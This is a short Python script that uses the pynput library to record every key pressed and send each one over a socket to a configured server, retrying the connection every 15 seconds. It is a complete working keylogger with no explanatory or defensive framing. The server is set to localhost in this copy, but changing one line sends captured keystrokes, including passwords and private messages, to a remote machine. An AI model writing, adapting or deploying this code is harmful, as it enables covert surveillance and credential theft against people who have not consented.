from pynput.keyboard import Key, Listener
import socket
import time

def initConn():
    global client
    client = socket.socket()
    while True:
        try:
            client.connect((SERVER_HOST, SERVER_PORT))
            break
        except Exception as err:
            print(err)
            time.sleep(15)
            pass
    print("Connection has been established!")


def on_press(key):
    try:
        client.send((str(key)).encode())
    except WindowsError as err:
        print(err)
        client.close()
        initConn()
        """
    if str(key) != "Key.ctrl_r":
        client.send((str(key)).encode())
    else:
        client.send((str(key)).encode())
        print("Connection Closed.")
        client.close()
        initConn()
        """

if __name__ == '__main__':
    SERVER_HOST = '127.0.0.1'
    SERVER_PORT = 47620
    initConn()
    with Listener(on_press=on_press) as listener:
        listener.join()


